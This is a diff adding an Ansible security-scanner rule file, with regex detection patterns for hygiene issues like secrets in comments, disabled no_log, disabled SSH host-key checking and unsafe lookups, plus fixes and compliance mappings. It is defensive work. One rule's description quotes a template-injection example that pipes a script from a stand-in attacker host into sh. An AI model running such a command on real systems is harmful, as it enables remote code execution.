@@ -1,0 +1,360 @@
+name: "Ansible Best Practice Hygiene Patterns"
+author: "Ansible Security Scanner Team"
+description: >
+  Detects Ansible-specific security hygiene issues that require awareness of
+  YAML task structure: secrets in comments, missing no_log on credential tasks,
+  and ignore_errors on security-critical operations.
+
+patterns:
+  # -- Secrets in Comments --------------------------------------------------
+  - id: "secret_in_comment"
+    category: "ansible_hygiene"
+    severity: "MEDIUM"
+    title: "Credential Visible in Comment"
+    description: "A commented-out line contains what appears to be a hardcoded credential. Even in comments, credentials are visible in version control history."
+    regex: "^\\s*#.*(?:password|passwd|pwd|secret|token|api_key|apikey)\\s*[:=]\\s*[\"']?(?!\\{\\{)[A-Za-z0-9!@#$%^&*()_+=./-]{6,}[\"']?"
+    positive_examples:
+      - "# truststore_password: cassandra"
+    recommendation: "Remove hardcoded credentials from comments; use placeholders like <REDACTED> or {{ vault_variable }}"
+    cwe: ['CWE-540', 'CWE-798']
+    owasp_appsec: ["A01:2021", "A07:2021"]
+    owasp_asvs: ["V2.10.2", "V2.10.4", "V14.1.5"]
+    mitre_attack: ['T1552.001']
+    cis_controls: ['CIS-3.1', 'CIS-Secrets']
+    nist_controls: ['AC-3', 'IA-5', 'IA-5(7)', 'SC-28']
+    pci_dss: ['3.5.1', '8.6.2']
+    hipaa: ['164.312(a)(2)(i)', '164.312(a)(2)(iv)', '164.312(d)']
+    soc2: ['C1.1', 'CC6.1']
+
+  - id: "commented_out_auth_block"
+    category: "ansible_hygiene"
+    severity: "MEDIUM"
+    title: "Commented-Out Authentication Block"
+    description: "A commented-out block contains authentication logic with potential credential exposure"
+    regex: "^\\s*#\\s*(?:body|url).*password=[^{]"
+    positive_examples:
+      - "#bodypassword=x"
+    recommendation: "Remove commented-out authentication code that contains credentials"
+    cwe: ['CWE-540', 'CWE-798']
+    owasp_appsec: ["A01:2021", "A07:2021"]
+    owasp_asvs: ["V2.10.2", "V2.10.4", "V14.1.5"]
+    mitre_attack: ['T1552.001']
+    cis_controls: ['CIS-3.1', 'CIS-Secrets']
+    nist_controls: ['AC-3', 'IA-5', 'IA-5(7)', 'SC-28']
+    pci_dss: ['3.5.1', '8.6.2']
+    hipaa: ['164.312(a)(2)(i)', '164.312(a)(2)(iv)', '164.312(d)']
+    soc2: ['C1.1', 'CC6.1']
+
+  # -- Dangerous Task Hygiene ----------------------------------------------
+  # Structural task-shape rules: credential-handling tasks missing no_log,
+  # downloads missing integrity, ignore_errors on security operations, and
+  # root-become tasks without logging suppression. These complement the
+  # category-specific rules (hardcoded_credentials, supply_chain, etc.) by
+  # catching the surrounding task-level hygiene errors.
+  - id: "no_log_explicitly_false_on_credential_task"
+    category: "ansible_hygiene"
+    severity: "HIGH"
+    title: "no_log Explicitly Disabled on Credential-Handling Task"
+    description: "A task block contains a secret-shaped variable (`{{ *_password }}`, `{{ *_token }}`, `{{ vault_* }}`, `{{ *_api_key }}`, `{{ *_secret_key }}`) AND explicitly sets `no_log: false` (or `no_log: no`). This defeats Ansible's log suppression and dumps the resolved secret value into every task-result log line, callback plugin, and CI artifact - which is strictly worse than forgetting `no_log` entirely, because the author made an active decision to disable it."
+    regex: "no_log\\s*:\\s*(?:false|no|False|No)\\b[\\s\\S]{0,400}?\\{\\{\\s*(?:vault_[a-zA-Z0-9_]+|[a-zA-Z0-9_]+(?:_password|_passwd|_token|_secret|_api_key|_apikey|_private_key))\\s*\\}\\}|\\{\\{\\s*(?:vault_[a-zA-Z0-9_]+|[a-zA-Z0-9_]+(?:_password|_passwd|_token|_secret|_api_key|_apikey|_private_key))\\s*\\}\\}[\\s\\S]{0,400}?no_log\\s*:\\s*(?:false|no|False|No)\\b"
+    positive_examples:
+      - |2-
+        no_log: false
+              # ...
+              msg: "{{ test_password }}
+    multiline: true
+    window: 14
+    recommendation: "Remove `no_log: false` or change to `no_log: true`. If you genuinely need to see the task output for debugging, strip the secret into a separate `register:` + `debug:` block that prints only non-sensitive fields (e.g. `{{ result.status }}` not `{{ result.content }}`)."
+    cwe: ['CWE-200', 'CWE-532', 'CWE-778']
+    owasp_appsec: ["A01:2021", "A09:2021"]
+    owasp_asvs: ["V7.1.1", "V7.2.1", "V8.1.1"]
+    mitre_attack: ['T1552.001', 'T1552.004']
+    cis_controls: ['CIS-8.2', 'CIS-Secrets']
+    nist_controls: ['AC-3', 'AU-2', 'AU-3', 'AU-9', 'AU-12', 'IA-5(7)', 'SC-28']
+    pci_dss: ['3.3.1', '3.5.1', '8.6.2', '10.2.1', '10.2.1.1', '10.3.1', '10.3.2']
+    hipaa: ['164.312(a)(1)', '164.312(a)(2)(i)', '164.312(b)', '164.312(e)(1)']
+    soc2: ['C1.1', 'CC6.1', 'CC6.7', 'CC7.2']
+
+  # NOTE: ``get_url_dest_executable_with_insecure_validate`` is
+  # implemented as an AST-based check in ``file_scanner.py`` rather
+  # than a windowed regex. The previous regex correlated ``get_url:``
+  # with a ``validate_certs: no`` several hundred chars later, which
+  # routinely crossed task boundaries in real playbooks (e.g. a
+  # ``get_url:`` with NO ``validate_certs:`` followed by an unrelated
+  # ``uri:`` task that legitimately disables cert validation). The AST
+  # check keys off the same task dict for both signals so it cannot
+  # cross-task-match.
+
+  - id: "ignore_errors_security"
+    category: "ansible_hygiene"
+    severity: "HIGH"
+    title: "ignore_errors on Security-Critical Task"
+    description: "`ignore_errors: true` (or `yes`) is set on a task whose name, module, path, or arguments reference a security-critical concern (firewall, selinux, sudoers, pam, auth, tls/ssl/cert, vault, iptables, ufw, key rotation). A hidden failure here leaves the system in a half-hardened state - often worse than no hardening at all, because the surrounding playbook reports success."
+    regex: "(?i)(?:name|path|dest|src|regexp|line|content)\\s*:\\s*['\"]?[^'\"\\n]*(?:firewall|selinux|sudoers|pam\\.d|pam_|auth_|\\btls\\b|\\bssl\\b|certificate|cert\\s|vault|iptables|\\bufw\\b|nftables|passwordless|kerberos|krb5|audit)[^\\n]{0,200}\\n[\\s\\S]{0,300}?^\\s*ignore_errors\\s*:\\s*(?:true|yes|True|Yes)\\b"
+    positive_examples:
+      - |2-
+        name: ensure SSL certificate is checked
+          # ...
+          ignore_errors: true
+    multiline: true
+    window: 10
+    recommendation: "Remove `ignore_errors: true` from security-hardening tasks. If the task legitimately may not apply to every host, use `failed_when:` with an explicit condition, or `when:` to skip where the prerequisite is absent. Silent failure on a firewall rule is not acceptable."
+    cwe: ['CWE-754', 'CWE-755']
+    mitre_attack: ['T1562.001']
+    cis_controls: ['CIS-3.11', 'CIS-8.2']
+    nist_controls: ['AU-2', 'AU-12']
+    pci_dss: ['10.2.1']
+    hipaa: ['164.312(b)']
+    soc2: ['CC7.2']
+
+  - id: "tags_never_on_security_task"
+    category: "ansible_hygiene"
+    severity: "MEDIUM"
+    title: "Security Task Tagged 'never' (Executes Only When Explicitly Requested)"
+    description: "A task with a name referencing a security concern (firewall, selinux, audit, harden, patch, cve, vulnerability, security) has `tags: [never, ...]` or `tags: never`. Tasks with the `never` tag are skipped by every `ansible-playbook` invocation UNLESS the caller passes `--tags never` - that means the security hardening never runs in normal runs, only when someone remembers to opt in. This is a classic 'defense-in-depth disabled by default' anti-pattern."
+    regex: "(?i)name\\s*:\\s*['\"]?[^'\"\\n]*(?:firewall|selinux|audit|hardening|harden|patch|cve-|vulnerability|\\bsecurity\\b|stig)[^\\n]{0,200}\\n[\\s\\S]{0,300}?^\\s*tags\\s*:\\s*(?:never\\b|\\[\\s*(?:[^\\]]*,\\s*)?never\\s*(?:,[^\\]]*)?\\s*\\])"
+    positive_examples:
+      - |-
+        name:firewall
+        tags:never
+    multiline: true
+    window: 10
+    recommendation: "Drop `tags: never` from security tasks. If a task is genuinely optional (e.g., emergency-only remediation), use a descriptive tag (`tags: emergency-only`) AND require an explicit `when:` guard so the task only runs when a specific variable is set - never rely on the caller to remember a magic tag."
+    cwe: ['CWE-1173', 'CWE-1188']
+    owasp_appsec: ["A04:2021"]
+    mitre_attack: ['T1562.001']
+    cis_controls: ['CIS-8.2']
+    nist_controls: ['AU-2', 'AU-12']
+    pci_dss: ['10.2.1']
+    hipaa: ['164.312(b)']
+    soc2: ['CC7.2']
+
+  - id: "fss_vault_on_non_secret_value"
+    category: "ansible_hygiene"
+    severity: "LOW"
+    title: "False-Sense-of-Security: !vault Applied to Non-Sensitive Value"
+    description: "A variable whose name indicates non-sensitive content (hostname, host, port, url, path, timeout, enabled, count, version, region, zone, protocol, scheme, filename, dir, directory) is assigned a `!vault |` encrypted block. Encrypting a hostname or port number doesn't protect anything - the value isn't secret - but it obscures the playbook from review, breaks diff-based audits, and creates a false-sense-of-security (real secrets and fake secrets become indistinguishable, so the real ones stop getting extra scrutiny). Reserve `ansible-vault encrypt_string` for passwords, tokens, private keys, and API credentials."
+    regex: "(?m)^\\s*[A-Za-z0-9_]*(?:hostname|host|port|url|path|timeout|enabled|count|version|region|zone|protocol|scheme|filename|\\bdir|directory)\\s*:\\s*!vault\\s*\\|"
+    positive_examples:
+      - "realpath: !vault |"
+    multiline: false
+    recommendation: "Move the value out of the vault: store it as plain YAML in `group_vars/` / `host_vars/` / `defaults/main.yml`. Keep the vault for real secrets only. If you need per-environment values (dev/stage/prod URLs), use inventory groups - not encryption - to separate them. A password, API token, private key, or session secret is vault-worthy; a URL, port, hostname, or timeout is not."
+    cwe: ['CWE-1173']
+    owasp_appsec: ["A04:2021"]
+    mitre_attack: []
+    cis_controls: ['CIS-3.1']
+    nist_controls: ['AC-3', 'SC-28']
+    pci_dss: ['3.5.1']
+    hipaa: ['164.312(a)(2)(iv)']
+    soc2: ['C1.1']
+
+  - id: "no_log_false_on_secret_handling_task"
+    category: "ansible_hygiene"
+    severity: "HIGH"
+    title: "no_log: false On Task Handling password/token/secret/api_key"
+    description: "A task explicitly sets `no_log: false` (or `no_log: no`, `no_log: False`) AND references `password:`, `token:`, `secret:`, `api_key:`, or `authorization:` in its module args. This writes the secret (or the full response containing it) in PLAINTEXT to the Ansible callback log, stdout, AAP/Tower job-output DB, and any CI-artifact upload. Default for sensitive modules is conservative but `no_log: false` forcibly overrides it - the exact config-drift that caused the 2024 TeamCity-Ansible-plugin incident where build logs contained every customer's SSH private key."
+    regex: "no_log\\s*:\\s*(?:false|no|False)[\\s\\S]{0,400}?(?:password|token|secret|api_key|authorization|bearer|access_key|private_key)\\s*:|(?:password|token|secret|api_key|authorization|bearer|access_key|private_key)\\s*:[\\s\\S]{0,400}?no_log\\s*:\\s*(?:false|no|False)"
+    positive_examples:
+      - |2-
+        no_log: false
+                    # ...
+                    password:
+    multiline: true
+    window: 20
+    recommendation: "Remove the `no_log: false` override. Ansible sensibly defaults `no_log: true` on modules it knows handle secrets (`user`, `uri` with `url_password`) - leaving it at the default is ALMOST ALWAYS correct. For debugging, instead of `no_log: false`, use `ANSIBLE_DEBUG=1 ansible-playbook -vvv` in a local, ephemeral environment with no real credentials. For AAP/Tower, ensure 'Redact Sensitive Information from stdout' is ON at the organization level. Audit every `no_log: false` in the codebase with `grep -r 'no_log:\\s*false' playbooks/ roles/` and treat each as a review-required change."
+    cwe: ['CWE-200', 'CWE-312', 'CWE-532']
+    owasp_appsec: ["A01:2021", "A04:2021", "A09:2021"]
+    owasp_asvs: ["V6.1.2", "V7.1.1", "V8.1.1", "V8.3.1"]
+    mitre_attack: ['T1005', 'T1552.001']
+    cis_controls: ['CIS-3.11', 'CIS-8.2', 'CIS-16.9']
+    nist_controls: ['AU-9', 'IA-5', 'SC-28']
+    pci_dss: ['3.5.1', '8.6.2', '10.2.1']
+    hipaa: ['164.312(a)(2)(iv)', '164.312(b)']
+    soc2: ['CC6.1', 'CC6.7']
+
+  - id: "ansible_host_key_checking_false_in_env_or_config"
+    category: "ansible_hygiene"
+    severity: "HIGH"
+    title: "ANSIBLE_HOST_KEY_CHECKING=False In env / group_vars / Dockerfile (MitM Enabler)"
+    description: "A task sets `ANSIBLE_HOST_KEY_CHECKING=False` (or `=0`, `=no`) in an `environment:` block, `group_vars/all.yml`, a Dockerfile `ENV`, or a CI pipeline env map. This disables SSH host-key verification for the entire Ansible control path, converting every connection into a MitM-vulnerable one. Attackers on-path (rogue Wi-Fi, compromised jump host, bluecoat-TLS-proxy misconfig) can intercept `ansible` -> `managed node` and steal root credentials or inject commands. This is distinct from the `ansible.cfg [defaults] host_key_checking = False` case (covered by ansible_cfg_host_key_checking_false) - this rule catches the env-level override that re-enables the weakness even when ansible.cfg is correct."
+    regex: "ANSIBLE_HOST_KEY_CHECKING\\s*[:=]\\s*['\"]?(?:False|false|0|no|No)['\"]?"
+    positive_examples:
+      - "ANSIBLE_HOST_KEY_CHECKING:False"
+    recommendation: "Remove the env override. For bootstrap scenarios where the host-key is genuinely unknown on first connect, use `ansible-playbook --ssh-extra-args='-o StrictHostKeyChecking=accept-new'` (OpenSSH 7.6+) which adds the key on first-contact but fails on subsequent mismatches - fundamentally safer than disabling checking forever. Populate `~/.ssh/known_hosts` in advance via `ssh-keyscan -t ed25519,ecdsa,rsa <host>` in a trusted build step. For containerised Ansible runners, bake known-hosts into the EE image."
+    cwe: ['CWE-295', 'CWE-300', 'CWE-322']
+    owasp_appsec: ["A02:2021", "A07:2021"]
+    owasp_asvs: ["V9.2.1"]
+    mitre_attack: ['T1040', 'T1557', 'T1557.002']
+    cis_controls: ['CIS-3.10', 'CIS-12.6']
+    nist_controls: ['IA-3', 'SC-8', 'SC-8(1)']
+    pci_dss: ['4.2.1', '8.5.1']
+    hipaa: ['164.312(e)(1)']
+    soc2: ['CC6.1', 'CC6.7']
+
+  - id: "ansible_vault_encrypt_string_with_inline_plaintext"
+    category: "ansible_hygiene"
+    severity: "MEDIUM"
+    title: "ansible-vault encrypt_string Invoked With Inline Plaintext Literal In Same File"
+    description: "A shell task invokes `ansible-vault encrypt_string` and passes the plaintext as a literal argument (not from stdin, not from an env var, not from a file outside the repo). The plaintext - typically the secret the author is about to vault - is captured in shell history, git commit history, and Ansible callback logs BEFORE encryption happens. The result is the classic pre-encryption leak: the vault ends up committed but so does the plaintext one commit earlier."
+    regex: "ansible-vault\\s+encrypt_string\\s+(?:['\"]?[^'\"$\\s-][^'\"\\s]{3,}['\"]?|--string\\s+['\"]?[^'\"$\\s-][^'\"\\s]{3,}['\"]?)"
+    positive_examples:
+      - "ansible-vault encrypt_string xxxx"
+    recommendation: "Always pass the plaintext via stdin: `read -rs secret && printf '%s' \"$secret\" | ansible-vault encrypt_string --stdin-name varname` - this keeps it out of shell history and argv. Add `HISTCONTROL=ignorespace` + prefix the command with a leading space. Never commit the plaintext-piping command itself. For CI, use `ansible-vault encrypt_string --vault-password-file <(echo \"$VAULT_PASSWORD_ENV\")` with stdin-only input. Audit git history for the plaintext with `git log -S '<plaintext-fragment>'` and if found, rotate the secret + git-filter-repo scrub."
+    cwe: ['CWE-312', 'CWE-522', 'CWE-532']
+    owasp_appsec: ["A04:2021", "A09:2021"]
+    owasp_asvs: ["V2.10.1", "V6.1.2", "V6.2.1", "V7.1.1", "V8.3.1"]
+    mitre_attack: ['T1552.001', 'T1552.004']
+    cis_controls: ['CIS-3.11', 'CIS-16.9']
+    nist_controls: ['AU-9', 'IA-5', 'SC-28']
+    pci_dss: ['3.5.1', '8.6.2']
+    hipaa: ['164.312(a)(2)(iv)']
+    soc2: ['CC6.1']
+
+  - id: "debug_var_of_registered_credential_output"
+    category: "ansible_hygiene"
+    severity: "HIGH"
+    title: "debug: var=<registered_result> After Task That Returned Credentials"
+    description: "A task registers the result of a credential-returning module (`community.hashi_vault.vault_kv2_get`, `community.hashi_vault.vault_kv_get`, `ansible.builtin.uri` with basic-auth, `community.aws.aws_secret`, `amazon.aws.secretsmanager_secret`) and a SUBSEQUENT task does `ansible.builtin.debug: var: <same-name>` or `msg: '{{ <name> }}'`. This echoes the secret to stdout / callback log / job-output DB. It's a subtly different leak from `no_log: false` because the debug task itself isn't marked sensitive and Ansible has no way to infer the provenance of the variable."
+    regex: "(?:community\\.hashi_vault\\.vault_(?:kv[12]?_get|read)|vault_kv_get|secrets?manager|aws_secret|ansible\\.builtin\\.uri[\\s\\S]{0,300}?(?:user|password|bearer))[\\s\\S]{0,200}?register\\s*:\\s*(\\w+)[\\s\\S]{0,1500}?(?:ansible\\.builtin\\.)?debug\\s*:[\\s\\S]{0,200}?(?:var\\s*:\\s*\\1\\b|msg\\s*:\\s*['\"].*\\{\\{\\s*\\1\\b)"
+    positive_examples:
+      - |2-
+            community.hashi_vault.vault_kv2_get:
+                    path: secret/db
+                  register: vault_secret
+                - ansible.builtin.debug:
+                    var: vault_secret
+    multiline: true
+    window: 80
+    recommendation: "Never `debug:` the result of a credential-returning task. If you must confirm a secret lookup succeeded, debug a derived non-sensitive attribute: `msg: 'Vault lookup ok, secret has {{ (vault_result.data.data.secret | length) }} chars'` - never the secret value. Mark the lookup task `no_log: true` explicitly (double-defence even though HashiCorp Vault module defaults to that). In AAP, enable 'Verbosity' = 0 on jobs that only need to confirm success, and enable Tower's secret-scrubbing on stdout. Audit history for accidental debug leaks with `grep -rnE 'debug:\\s*\\n\\s*(var|msg):.*vault_(kv_get|result)' .`."
+    cwe: ['CWE-200', 'CWE-312', 'CWE-532']
+    owasp_appsec: ["A01:2021", "A04:2021", "A09:2021"]
+    owasp_asvs: ["V6.1.2", "V7.1.1", "V8.1.1", "V8.3.1"]
+    mitre_attack: ['T1005', 'T1552.001']
+    cis_controls: ['CIS-3.11', 'CIS-8.2', 'CIS-16.9']
+    nist_controls: ['AU-9', 'IA-5', 'SC-28']
+    pci_dss: ['3.5.1', '8.6.2', '10.2.1']
+    hipaa: ['164.312(a)(2)(iv)', '164.312(b)']
+    soc2: ['CC6.1', 'CC6.7']
+
+  - id: "debug_of_ansible_magic_auth_variable"
+    category: "ansible_hygiene"
+    severity: "CRITICAL"
+    title: "debug: var / msg Echoes ansible_password / ansible_become_password (Active Credential Leak)"
+    description: "An `ansible.builtin.debug` task (or bare `debug:`) prints one of Ansible's reserved magic authentication variables - `ansible_password`, `ansible_ssh_pass`, `ansible_become_password`, `ansible_become_pass`, `ansible_sudo_pass`, `ansible_su_pass`, `ansible_httpapi_pass`, or `ansible_netconf_pass`. These variables hold the **live** SSH/become/API password the controller is currently using against managed nodes, and Ansible does NOT auto-scrub them from debug output. The result leaks to stdout, to the ansible-runner job artifacts, to the AWX/AAP job-output database, to CI log archives, and to any callback plugin (Splunk, Datadog, Slack) attached to the run. Unlike hardcoded-secret rules, this catches the case where the credential is sourced legitimately (vault / CI secret store) but then immediately dumped via a careless debug - a common 'let me just check what I'm using' developer pattern that survives code review because the debug looks harmless."
+    regex: "(?ms)(?:ansible\\.builtin\\.)?debug\\s*:[\\s\\S]{0,200}?(?:var\\s*:\\s*['\"]?(?:ansible_(?:ssh_pass|password|become_pass(?:word)?|sudo_pass|su_pass|httpapi_pass|netconf_pass))['\"]?\\s*$|msg\\s*:\\s*[^\\n]*\\{\\{\\s*ansible_(?:ssh_pass|password|become_pass(?:word)?|sudo_pass|su_pass|httpapi_pass|netconf_pass)\\b)"
+    multiline: true
+    window: 12
+    recommendation: "Delete the debug task. If you are genuinely trying to verify auth - run `ansible -m ping` against a single host and check the return code (0 = auth OK), or debug a derived non-sensitive value (e.g. `msg: 'using {{ ansible_user }}@{{ inventory_hostname }}'`). If the debug is CI-temporary, gate it behind an explicit `when: lookup('env','ALLOW_DEBUG_SECRETS')=='1'` AND mark `no_log: true` on the task - but understand that `no_log` on a debug task is a known Ansible foot-gun (it still prints the raw template under `-v`/`-vv`). The only safe remediation is removal."
+    positive_examples:
+      - |
+        - name: show the password
+          debug:
+            var: ansible_password
+      - |
+        - name: show become password in message
+          ansible.builtin.debug:
+            msg: "Using {{ ansible_become_password }} for {{ inventory_hostname }}"
+      - |
+        - name: echo sudo pass
+          debug:
+            var: 'ansible_sudo_pass'
+    negative_examples:
+      - |
+        - name: show which user
+          debug:
+            var: ansible_user
+      - |
+        - name: show host info
+          debug:
+            msg: "Running as {{ ansible_user }}@{{ inventory_hostname }}"
+      - |
+        - name: show custom var
+          debug:
+            var: ansible_passthrough_config
+    cwe: ['CWE-200', 'CWE-312', 'CWE-532']
+    owasp_appsec: ["A01:2021", "A04:2021", "A09:2021"]
+    owasp_asvs: ["V6.1.2", "V7.1.1", "V8.1.1", "V8.3.1"]
+    mitre_attack: ['T1005', 'T1552.001']
+    cis_controls: ['CIS-3.11', 'CIS-8.2', 'CIS-16.9']
+    nist_controls: ['AU-9', 'IA-5', 'SC-28']
+    pci_dss: ['3.5.1', '8.6.2', '10.2.1']
+    hipaa: ['164.312(a)(2)(iv)', '164.312(b)']
+    soc2: ['CC6.1', 'CC6.7']
+
+  - id: "allow_unsafe_lookups_enabled"
+    category: "ansible_hygiene"
+    severity: "HIGH"
+    title: "ALLOW_UNSAFE_LOOKUPS Enabled (Lookup Plugin Unsafe-String Bypass)"
+    description: "`ALLOW_UNSAFE_LOOKUPS = True` (or `allow_unsafe_lookups: true` in play-level `vars:` / role `defaults/main.yml` / `ansible.cfg`) disables Ansible's default protection that strips the `!unsafe` marker from values returned by lookup plugins. Once disabled, a malicious or attacker-controlled external source read by `lookup('file', ...)`, `lookup('url', ...)`, `lookup('pipe', ...)`, `lookup('hashi_vault', ...)`, or any custom lookup can return a Jinja expression (`{{ lookup('pipe','curl evil.example.com/x.sh | sh') }}`) that will then be re-evaluated by Ansible's template engine - classic template-injection-to-RCE."
+    regex: "(?mi)^\\s*(?:ALLOW_UNSAFE_LOOKUPS|allow_unsafe_lookups)\\s*[:=]\\s*(?:true|True|yes|Yes|1)\\b"
+    positive_examples:
+      - "allow_unsafe_lookups=True"
+    multiline: false
+    recommendation: "Remove the setting; the Ansible default (`False`) is correct. If a trusted internal lookup legitimately returns template expressions that must be rendered (extremely rare), wrap only that one lookup call in `| from_yaml` or an explicit per-call opt-in - never flip the global switch. Audit every playbook, `ansible.cfg`, `group_vars/`, `host_vars/`, and role `defaults/main.yml` with `grep -rniE 'allow_unsafe_lookups\\s*[:=]\\s*(true|yes|1)' .` and treat each hit as a critical finding."
+    cwe: ['CWE-94', 'CWE-200', 'CWE-1336']
+    owasp_appsec: ["A01:2021", "A03:2021"]
+    owasp_asvs: ["V8.1.1"]
+    mitre_attack: ['T1059.004', 'T1105']
+    cis_controls: ['CIS-2.3', 'CIS-16.10']
+    nist_controls: ['SC-18', 'SI-3', 'SI-10']
+    pci_dss: ['6.2.4', '6.5.1']
+    hipaa: ['164.312(c)(1)']
+    soc2: ['CC6.1', 'CC7.1']
+
+  # NOTE: ``become_user_without_become_true`` is implemented as an
+  # AST-based check in ``file_scanner.py`` (not a regex rule), because
+  # ``become:`` can appear BEFORE or AFTER ``become_user:`` within a
+  # task, and can also be inherited from the enclosing play block -
+  # none of which a line-windowed regex can reliably model without
+  # false positives.
+
+  - id: "github_actions_allow_unsecure_commands_env_true"
+    category: "ansible_hygiene"
+    severity: "HIGH"
+    title: "ACTIONS_ALLOW_UNSECURE_COMMANDS=true in Workflow or Ansible-Rendered Workflow"
+    description: "Sets the GitHub Actions escape-hatch environment variable `ACTIONS_ALLOW_UNSECURE_COMMANDS=true`, which re-enables the deprecated `::set-env::` and `::add-path::` workflow commands. With this on, ANY `echo ::set-env name=FOO::$user_controlled` step can inject environment variables - including `LD_PRELOAD`, `PATH`, `NODE_OPTIONS` - into subsequent steps' shells. This is an RCE-as-a-feature primitive and was the root cause of CVE-2020-15228. Playbooks that template `.github/workflows/*.yml` or `ansible.builtin.copy` a workflow file containing this env var re-introduce the hole."
+    regex: "(?mi)ACTIONS_ALLOW_UNSECURE_COMMANDS\\s*[:=]\\s*['\"]?(?:true|1|yes)\\b"
+    positive_examples:
+      - "ACTIONS_ALLOW_UNSECURE_COMMANDS:true"
+    multiline: false
+    recommendation: "Never enable `ACTIONS_ALLOW_UNSECURE_COMMANDS`. If a legacy tool still emits `::set-env::` / `::add-path::` instructions, rewrite it to use `$GITHUB_ENV` / `$GITHUB_PATH` files (`echo 'FOO=bar' >> $GITHUB_ENV`). Audit every `.github/workflows/*.yml` and any Ansible template that renders workflow YAML: `grep -rnE 'ACTIONS_ALLOW_UNSECURE_COMMANDS\\s*[:=]' .github/ playbooks/ roles/`. Enforce the organisation-level 'Disable set-env' policy via GitHub's enterprise settings."
+    cwe: ['CWE-77', 'CWE-78', 'CWE-94']
+    cve: ["CVE-2020-15228"]
+    owasp_appsec: ["A03:2021"]
+    mitre_attack: ['T1059.004', 'T1068']
+    cis_controls: ['CIS-16.1', 'CIS-16.11']
+    nist_controls: ['AC-3', 'CM-7', 'SI-10']
+    pci_dss: ['6.2.4', '6.5.1']
+    hipaa: ['164.312(c)(1)']
+    soc2: ['CC6.1', 'CC7.1']
+
+  - id: "ansible_block_without_rescue_or_always"
+    category: "ansible_hygiene"
+    severity: "LOW"
+    title: "ansible Block Without rescue/always Handler (Silent-Failure Anti-Pattern)"
+    description: "A top-level `- block:` construct is declared without a sibling `rescue:` or `always:` key within ~200 lines of the `block:` opener. Ansible's block primitive exists specifically to provide try/except semantics - a block with NO `rescue:` swallows any task-level failure behavior into the default fail-fast, which is often NOT what the author intends (expected pattern: log the failure, remediate, continue). More importantly, the lack of `rescue:` is the #1 source of half-applied configuration drift: a middle task in the block fails, Ansible aborts, earlier tasks' side-effects (file creates, service starts, DB rows) remain - and the next run may not reconcile them."
+    # Detection is handled by the AST walker in
+    # ``FileScanner._scan_structural_hygiene`` so we always inspect the
+    # full task body regardless of window-scan boundaries. The regex
+    # below is retained as a no-op sentinel (an always-failing negative
+    # lookahead) so the rule id, framework tags, and remediation
+    # metadata still resolve via the patterns registry. (The previous
+    # line-window regex produced false positives on blocks whose
+    # rescue/always keys were more than ~100 lines after the block
+    # opener, and false negatives on blocks whose rescue/always keys
+    # fell inside the regex's greedy consume window - neither case is
+    # solvable with a windowed regex.)
+    regex: "(?!)"
+    positive_examples:
+      - |2
+        - block:
+            - name: do work
+              ansible.builtin.shell: /bin/true
+    recommendation: "Add a `rescue:` (and ideally `always:`) peer to every block that mutates remote state: `- block: [...tasks...] rescue: [- name: mark failure, ansible.builtin.set_fact: remediation_needed=true] always: [- name: unlock, ansible.builtin.file: state=absent, path=/var/run/lock.pid]`. For pure read-only blocks (gathering info with `register:`), a simple `rescue: [- debug: msg=read failed]` is enough to silence this rule. Reference: https://docs.ansible.com/ansible/latest/user_guide/playbooks_blocks.html"
+    cwe: ['CWE-460', 'CWE-703', 'CWE-755']
+    mitre_attack: ['T1499']
+    cis_controls: ['CIS-4.11']
+    nist_controls: ['SI-11', 'SI-17']
+    pci_dss: ['6.4.3']
+    hipaa: ['164.308(a)(1)(ii)(D)']
+    soc2: ['CC7.1', 'CC8.1']
